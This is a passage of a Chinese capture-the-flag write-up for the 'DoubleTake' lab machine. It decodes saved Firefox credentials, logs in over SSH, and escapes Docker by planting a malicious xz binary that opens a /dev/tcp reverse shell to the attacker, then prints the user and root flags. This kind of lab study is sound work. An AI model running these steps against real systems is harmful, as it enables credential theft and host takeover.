+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">7f906e0ee8ec:~/.mozilla/firefox$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">16</span>
+</span></span><span class="line"><span class="cl">drwxr-sr-x    <span class="m">3</span> alpine   alpine        <span class="m">4096</span> Nov <span class="m">10</span> 20:15 .
+</span></span><span class="line"><span class="cl">drwxr-sr-x    <span class="m">3</span> alpine   alpine        <span class="m">4096</span> Nov <span class="m">10</span> 20:15 ..
+</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> alpine   alpine         <span class="m">102</span> Nov <span class="m">10</span> 20:15 profiles.ini
+</span></span><span class="line"><span class="cl">drwxr-sr-x    <span class="m">2</span> alpine   alpine        <span class="m">4096</span> Nov <span class="m">10</span> 20:15 zentara.default
+</span></span><span class="line"><span class="cl">7f906e0ee8ec:~/.mozilla/firefox$ cat profiles.ini 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Profile0<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Name</span><span class="o">=</span>default
+</span></span><span class="line"><span class="cl"><span class="nv">IsRelative</span><span class="o">=</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Path</span><span class="o">=</span>zentara.default
+</span></span><span class="line"><span class="cl"><span class="nv">Default</span><span class="o">=</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>General<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">StartWithLastProfile</span><span class="o">=</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>profiles.ini</code> 是 Firefox 的配置索引文件，作用是记录有哪些用户配置(profile)、路径。这里就指定了 <code>Path=zentara.default</code>，意思是该目录是真实的浏览器配置目录。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">7f906e0ee8ec:~/.mozilla/firefox/zentara.default$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">88</span>
+</span></span><span class="line"><span class="cl">drwxr-sr-x    <span class="m">2</span> alpine   alpine        <span class="m">4096</span> Nov <span class="m">10</span> 20:15 .
+</span></span><span class="line"><span class="cl">drwxr-sr-x    <span class="m">3</span> alpine   alpine        <span class="m">4096</span> Nov <span class="m">10</span> 20:15 ..
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> alpine   alpine       <span class="m">28672</span> Nov <span class="m">10</span> 20:15 cert9.db
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> alpine   alpine       <span class="m">36864</span> Nov <span class="m">10</span> 20:15 key4.db
+</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> alpine   alpine         <span class="m">487</span> Nov <span class="m">10</span> 20:15 logins.json
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> alpine   alpine         <span class="m">456</span> Nov <span class="m">10</span> 20:15 pkcs11.txt
+</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> alpine   alpine         <span class="m">182</span> Nov <span class="m">10</span> 20:15 prefs.js
+</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> alpine   alpine           <span class="m">2</span> Nov <span class="m">10</span> 20:15 signedInUser.json
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>cert9.db</code> 是 Firefox 证书库；<code>pkcs11.txt</code> 加密模块配置；<code>prefs.js</code> 浏览器偏好配置；<code>signedInUser.json</code> Firefox 账号登录信息。这些都不属于敏感信息。</p>
+<p><code>key4.db</code> 密钥库，用于加密解密 <code>logins.json</code> 里保存的账号密码。</p>
+<p><code>logins.json</code> 明文存放保存的账户密码字段。</p>
+<p>美化后的 <code>logins.json</code> 内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;nextId&#34;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;logins&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;hostname&#34;</span><span class="p">:</span> <span class="s2">&#34;http://172.17.0.1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;httpRealm&#34;</span><span class="p">:</span> <span class="s2">&#34;Zentara&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;formActionOrigin&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;usernameField&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;passwordField&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;encryptedUsername&#34;</span><span class="p">:</span> <span class="s2">&#34;Ym9i&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;encryptedPassword&#34;</span><span class="p">:</span> <span class="s2">&#34;Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;guid&#34;</span><span class="p">:</span> <span class="s2">&#34;{a1b2c3d4-e5f6-7890-abcd-ef1234567890}&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;encType&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;timeCreated&#34;</span><span class="p">:</span> <span class="mi">1730000000000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;timeLastUsed&#34;</span><span class="p">:</span> <span class="mi">1730900000000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;timePasswordChanged&#34;</span><span class="p">:</span> <span class="mi">1730000000000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;timesUsed&#34;</span><span class="p">:</span> <span class="mi">14</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;potentiallyVulnerablePasswords&#34;</span><span class="p">:</span> <span class="p">[],</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;dismissedBreachAlertsByLoginGUID&#34;</span><span class="p">:</span> <span class="p">{},</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于 <code>encType</code> 字段为 0，所以没有加密，只有 <code>base64</code> 编码。</p>
+<p>对编码后的用户名、密码进行解码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">echo</span> <span class="s2">&#34;Ym9i&#34;</span> <span class="p">|</span> base64 -d
+</span></span><span class="line"><span class="cl">bob                                                                                             
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">echo</span> <span class="s2">&#34;Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==&#34;</span> <span class="p">|</span> base64 -d
+</span></span><span class="line"><span class="cl">CorrectHorseBatteryStaple
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个密码可以用于登录 80 端口。</p>
+<p><img src="/p/19.-doubletake/assets/image-20261114204010147.png"
+	width="1123"
+	height="525"
+	srcset="/p/19.-doubletake/assets/image-20261114204010147_hu2066329880848227170.png 480w, /p/19.-doubletake/assets/image-20261114204010147_hu14947129569207431605.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261114204010147"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="213"
+		data-flex-basis="513px"
+	
+></p>
+<p>同时，本机也有一个用户 bob。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">7f906e0ee8ec:~/.mozilla/firefox/zentara.default$ cat /etc/passwd
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/sh
+</span></span><span class="line"><span class="cl">bin:x:1:1:bin:/bin:/sbin/nologin
+</span></span><span class="line"><span class="cl">daemon:x:2:2:daemon:/sbin:/sbin/nologin
+</span></span><span class="line"><span class="cl">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+</span></span><span class="line"><span class="cl">sync:x:5:0:sync:/sbin:/bin/sync
+</span></span><span class="line"><span class="cl">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+</span></span><span class="line"><span class="cl">halt:x:7:0:halt:/sbin:/sbin/halt
+</span></span><span class="line"><span class="cl">mail:x:8:12:mail:/var/mail:/sbin/nologin
+</span></span><span class="line"><span class="cl">news:x:9:13:news:/usr/lib/news:/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+</span></span><span class="line"><span class="cl">cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+</span></span><span class="line"><span class="cl">ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+</span></span><span class="line"><span class="cl">sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+</span></span><span class="line"><span class="cl">games:x:35:35:games:/usr/games:/sbin/nologin
+</span></span><span class="line"><span class="cl">ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+</span></span><span class="line"><span class="cl">guest:x:405:100:guest:/dev/null:/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/:/sbin/nologin
+</span></span><span class="line"><span class="cl">alpine:x:1000:1000::/home/alpine:/bin/sh
+</span></span><span class="line"><span class="cl">bob:x:1001:1001::/home/bob:/bin/sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以我们也可以尝试 SSH 直接连接。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ssh bob@10.129.76.130   
+</span></span><span class="line"><span class="cl">bob@10.129.76.130<span class="err">&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">Welcome to Alpine!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The Alpine Wiki contains a large amount of how-to guides and general
+</span></span><span class="line"><span class="cl">information about administrating Alpine systems.
+</span></span><span class="line"><span class="cl">See &lt;https://wiki.alpinelinux.org/&gt;.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">You can setup the system with the command: setup-alpine
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">You may change this message by editing /etc/motd.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">7f906e0ee8ec:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bob<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>bob<span class="o">)</span>
+</span></span><span class="line"><span class="cl">7f906e0ee8ec:~$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">20</span>
+</span></span><span class="line"><span class="cl">drwxr-sr-x    <span class="m">1</span> bob      bob           <span class="m">4096</span> Nov <span class="m">14</span> 12:40 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root     root          <span class="m">4096</span> Nov <span class="m">10</span> 20:15 ..
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> bob      bob             <span class="m">10</span> Nov <span class="m">14</span> 12:40 .ash_history
+</span></span><span class="line"><span class="cl">-rw-r-----    <span class="m">1</span> root     bob             <span class="m">33</span> Nov <span class="m">14</span> 12:17 user.txt
+</span></span><span class="line"><span class="cl">7f906e0ee8ec:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">18a16920cde6496a5a8963a0cb61ba5c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到 user flag：<code>18a16920cde6496a5a8963a0cb61ba5c</code>。</p>
+<h2 id="提权">提权
+</h2><h3 id="web-侦察">Web 侦察
+</h3><p>Web 页面是一个名叫 <code>Zentara</code> 的 AI 聊天助手。</p>
+<p><img src="/p/19.-doubletake/assets/image-20261114204346188.png"
+	width="1560"
+	height="1472"
+	srcset="/p/19.-doubletake/assets/image-20261114204346188_hu5460930311505447232.png 480w, /p/19.-doubletake/assets/image-20261114204346188_hu11579065843364191824.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261114204346188"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="105"
+		data-flex-basis="254px"
+	
+></p>
+<p>在 <code>Deploy</code> 页面有一个文件上传接口，可以上传压缩包 <code>.tar</code> <code>.tar.gz</code> <code>.tar.xz</code></p>
+<p><img src="/p/19.-doubletake/assets/image-20261114205130993.png"
+	width="1530"
+	height="1042"
+	srcset="/p/19.-doubletake/assets/image-20261114205130993_hu7959200787361208155.png 480w, /p/19.-doubletake/assets/image-20261114205130993_hu6473259565488890465.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261114205130993"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="146"
+		data-flex-basis="352px"
+	
+></p>
+<p>而 <code>Status</code> 页面展示了网站的配置，暴露了 Docker 版本为 <code>29.5.0</code>。</p>
+<p><img src="/p/19.-doubletake/assets/image-20261114205211752.png"
+	width="1534"
+	height="901"
+	srcset="/p/19.-doubletake/assets/image-20261114205211752_hu5025326486380240796.png 480w, /p/19.-doubletake/assets/image-20261114205211752_hu194156589442617055.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261114205211752"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="170"
+		data-flex-basis="408px"
+	
+></p>
+<h3 id="cve-2026-41567">CVE-2026-41567
+</h3><p><code>Docker</code> 直到 <code>29.5.0</code> 版本，在 <code>PUT /containers/{id}/archive</code> 都存在二进制解析缺陷漏洞。</p>
+<p>当守护进程收到压缩包后，会按照程序名去容器的 <code>overlay</code> 文件系统里查找解压程序，而不是主机上的解压程序。</p>
+<p>这些被解压得到的二进制程序，会以该守护进程的身份允许，也就是宿主机的 <code>root</code> 权限运行，并且拥有无限制权限，包括 <code>CAP_SYS_ADMIN</code>。</p>
+<p>受影响的程序为 <code>xz</code> 和 <code>unpigz</code>。</p>
+<p>Docker 里存在 <code>xz</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">7f906e0ee8ec:~$ which xz
+</span></span><span class="line"><span class="cl">/usr/bin/xz
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在攻击者机器上编译一个静态替代 xz。</p>
+<p>当 Docker 守护进程调用它时，进程继承 CAP_SYS_ADMIN 并在主机 PID 命名空间中运行。</p>
+<p>将 procfs 挂载并 chroot 到 /proc/1/root 可以访问主机文件系统。</p>
+<p><code>xz.c</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mount.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 挂载proc文件系统
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mount</span><span class="p">(</span><span class="s">&#34;proc&#34;</span><span class="p">,</span> <span class="s">&#34;/proc&#34;</span><span class="p">,</span> <span class="s">&#34;proc&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// chroot切换根到宿主机PID1的根目录,完成逃逸
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">chroot</span><span class="p">(</span><span class="s">&#34;/proc/1/root&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">chdir</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 反弹shell
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">execl</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="s">&#34;bash&#34;</span><span class="p">,</span> <span class="s">&#34;-c&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="s">&#34;bash -i &gt;&amp; /dev/tcp/10.10.17.69/1234 0&gt;&amp;1&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# vim xz.c   
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# gcc --static -o xz xz.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用 <code>tar</code> 压缩。这里压缩包中的目录结构为 <code>usr/bin/xz</code>，这样靶机在根目录 <code>tar</code> 解压后，会自动覆盖原本存在的 <code>/usr/bin/xz</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# mkdir -p pkg/usr/bin 
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# cp xz pkg/usr/bin/xz                                      
+</span></span><span class="line"><span class="cl">         
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">cd</span> pkg <span class="o">&amp;&amp;</span> tar cf ../plant.tar usr/bin/xz
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake/pkg<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">cd</span> .. 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意 <code>Target path</code> 选择为根目录。</p>
+<p><img src="/p/19.-doubletake/assets/image-20261114211849173.png"
+	width="1563"
+	height="766"
+	srcset="/p/19.-doubletake/assets/image-20261114211849173_hu16352283007788835834.png 480w, /p/19.-doubletake/assets/image-20261114211849173_hu9448565753227659714.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261114211849173"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="204"
+		data-flex-basis="489px"
+	
+></p>
+<p>成功覆盖 <code>xz</code> 之后，创建一个最小的 xz 压缩包。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">echo</span> x &gt; t <span class="o">&amp;&amp;</span> tar cf - t <span class="p">|</span> xz &gt; trigger.tar.xz 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同时在本机开启端口监听，准备反弹 Shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传该 <code>.tar.xz</code> 压缩包，守护进程会调用 <code>/usr/bin/xz</code> ，从而执行我们的恶意代码。</p>
+<p><img src="/p/19.-doubletake/assets/image-20261114212511804.png"
+	width="1558"
+	height="795"
+	srcset="/p/19.-doubletake/assets/image-20261114212511804_hu7758423852251209578.png 480w, /p/19.-doubletake/assets/image-20261114212511804_hu17222942458518894962.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261114212511804"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="195"
+		data-flex-basis="470px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/DoubleTake<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.17.69<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.52.41<span class="o">]</span> <span class="m">45234</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1372<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">root@doubletake:/# id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@doubletake:/# cat /root/root.txt
+</span></span><span class="line"><span class="cl">cat /root/root.txt
+</span></span><span class="line"><span class="cl">7e87656d4e1e919725cf733c5355cad7
+</span></span></code></pre></td></tr></table>
+</div>
